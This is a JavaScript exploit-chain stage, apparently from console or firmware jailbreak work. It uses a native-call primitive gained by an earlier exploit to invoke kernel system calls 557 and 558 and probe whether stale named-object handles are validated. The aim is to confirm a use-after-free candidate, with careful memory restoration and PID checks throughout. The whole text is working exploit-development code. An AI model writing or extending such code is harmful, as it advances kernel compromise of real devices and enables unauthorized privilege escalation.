// The decisive NamedObj question: does 558 validate the generation
// bits? Handle layout (slots-probe proven): (generation << 13) | slot,
// 3-bit gen incremented per slot reuse. Protocol (one shot, one 558 on
// a stale handle, self-created handles only):
//   1. alloc A -> hA (slot s, gen g)
//   2. 558(hA)
//   3. alloc B -> hB; expect same slot (hB & 0x1fff == hA & 0x1fff),
//      different handle (gen g+1). If the slot was not reused, abort
//      gracefully (delete B if live) and report.
//   4. mark, 558(hA) ONCE (the stale delete), mark.
//      0        -> generation NOT validated: the stale handle freed
//                  B. Do NOT touch hB. Alloc C: if C takes slot s
//                  (gen g+2), B was freed — UAF candidate. Capture
//                  and stop.
//      ESRCH    -> generation IS validated: NamedObj closed for this
//                  shape; clean up hB.
// Full restore, PID verified, markers 7 of 8.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native || typeof native.call !== "function" ||
      !native.frame || !Number.isSafeInteger(native.frameAddress))
    throw new Error("chain_missing");
  var frame = native.frame;
  var address = native.frameAddress;
  var nameOffset = 0x200;
  var regionEnd = nameOffset + 32;
  if (regionEnd > frame.length)
    throw new Error("frame_region_too_small");
  var nameAddress = address + nameOffset;
  var original = Array.from(frame.subarray(nameOffset, regionEnd));
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  function alloc(text) {
    for (var i = 0; i < text.length; i++)
      frame[nameOffset + i] = text.charCodeAt(i);
    frame[nameOffset + text.length] = 0;
    for (var z = text.length + 1; z < 24; z++) frame[nameOffset + z] = 0;
    var call = native.call("sys557", [nameAddress, text.length]);
    var errno = (call.value === -1) ? native.readErrno() : null;
    if (errno !== null || call.value <= 0 || call.value > 0xffffff)
      return { h: call.value, errno: errno };
    return { h: call.value, errno: null,
      slot: call.value & 0x1fff, gen: call.value >>> 13 };
  }
  function del(h) {
    var call = native.call("sys558", [h, 0, 0]);
    var errno = (call.value === -1) ? native.readErrno() : null;
    return { ret: call.value, errno: errno };
  }
  function fmt(a) {
    return a.h + "/" + (a.errno === null ? "ok" : a.errno) +
      (a.slot === undefined ? "" :
        "(s" + a.slot.toString(16) + ",g" + a.gen + ")");
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("genstale_preflight");
  phase = "alloc_a";
  var A = alloc("GenStaleA");
  mark("genstale_have_a");
  if (A.errno !== null)
    throw new Error("alloc_a_failed");
  phase = "del_a";
  var delA = del(A.h);
  mark("genstale_deleted_a");
  if (delA.ret !== 0)
    throw new Error("del_a_failed");
  phase = "alloc_b";
  var B = alloc("GenStaleB");
  mark("genstale_have_b");
  if (B.errno !== null)
    throw new Error("alloc_b_failed");
  var slotReused = (B.slot === A.slot);
  var lines = ["A:" + fmt(A), "delA:" + delA.ret + "/" +
    (delA.errno === null ? "ok" : delA.errno), "B:" + fmt(B),
    "slot_reused:" + (slotReused ? 1 : 0)];
  if (!slotReused) {
    lines.push("verdict:slot_not_reused");
    var cleanup = del(B.h);
    lines.push("cleanupB:" + cleanup.ret + "/" +
      (cleanup.errno === null ? "ok" : cleanup.errno));
    var after0 = native.call("getpid", []);
    mark("genstale_done");
    result = { id: "gen_stale_v1", status: "pass",
      details: { lines: lines.join(" | ").slice(0, 400),
        pid_ok: after0.value === before.value && after0.high === 0 } };
    for (var r0 = 0; r0 < original.length; r0++)
      frame[nameOffset + r0] = original[r0];
    return [result];
  }
  if (B.h === A.h)
    throw new Error("handle_identical_unexpected");
  phase = "stale_delete";
  mark("genstale_before_stale_del");
  var staleDel = del(A.h);
  mark("genstale_after_stale_del");
  lines.push("stale_del_hA:" + staleDel.ret + "/" +
    (staleDel.errno === null ? "ok" : staleDel.errno));
  if (staleDel.ret === 0) {
    lines.push("verdict:generation_NOT_validated");
    phase = "alloc_c";
    var C = alloc("GenStaleC");
    lines.push("C:" + fmt(C));
    if (C.errno === null) {
      var cReuses = (C.slot === A.slot);
      lines.push("c_reuses_slot:" + (cReuses ? 1 : 0) +
        (cReuses ? ",gen=" + C.gen : ""));
      lines.push("verdict_c:" + (cReuses && C.gen === A.gen + 2 ?
        "B_freed_by_stale_delete_UAF_candidate" :
        "c_did_not_confirm"));
      if (!cReuses) {
        var delC = del(C.h);
        lines.push("cleanupC:" + delC.ret + "/" +
          (delC.errno === null ? "ok" : delC.errno));
      }
    }
  } else if (staleDel.errno === 3) {
    lines.push("verdict:generation_validated");
    var cleanupB = del(B.h);
    lines.push("cleanupB:" + cleanupB.ret + "/" +
      (cleanupB.errno === null ? "ok" : cleanupB.errno));
  } else {
    lines.push("verdict:unexpected_errno");
    var cleanupB2 = del(B.h);
    lines.push("cleanupB:" + cleanupB2.ret + "/" +
      (cleanupB2.errno === null ? "ok" : cleanupB2.errno));
  }
  mark("genstale_done");
  for (var r = 0; r < original.length; r++)
    frame[nameOffset + r] = original[r];
  var restored = true;
  for (var r2 = 0; r2 < original.length; r2++)
    if (frame[nameOffset + r2] !== original[r2]) { restored = false; break; }
  var after = native.call("getpid", []);
  result = { id: "gen_stale_v1",
    status: (after.value === before.value && after.high === 0 &&
      restored) ? "pass" : "fail",
    details: { lines: lines.join(" | ").slice(0, 480),
      pid_ok: after.value === before.value && after.high === 0,
      region_restored: restored } };
} catch (error) {
  result = { id: "gen_stale_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
